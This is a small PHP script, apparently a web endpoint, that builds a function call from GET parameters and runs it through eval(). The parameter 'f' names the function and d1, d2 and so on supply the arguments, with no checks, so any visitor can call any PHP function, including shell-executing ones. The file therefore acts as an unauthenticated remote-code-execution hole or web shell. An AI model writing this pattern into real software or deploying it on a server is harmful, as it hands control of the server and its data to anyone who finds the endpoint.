<?PHP

require_once("function.php");
//echo("qq");
for($i=1; $i<=999; $i++){
if($_GET['d'.$i]==''){
break;
} else{
$d=substr($_GET['d'.$i],1);
if(strlen($d)<>strlen(intval($d)) or $d==0){
$d="\"".$d."\"";
} 

$data=$data.",".$d;
}
}
if($_GET['f']<>''){
//echo("echo ".$_GET['f']."(".substr($data,1).");");
eval("echo ".$_GET['f']."(".substr($data,1).");");
} 

/*

$qq['11']='qqq';
$qq['12']='qqq';
save_array("qq");
echo("qq");
*/
//echo("qq");
?>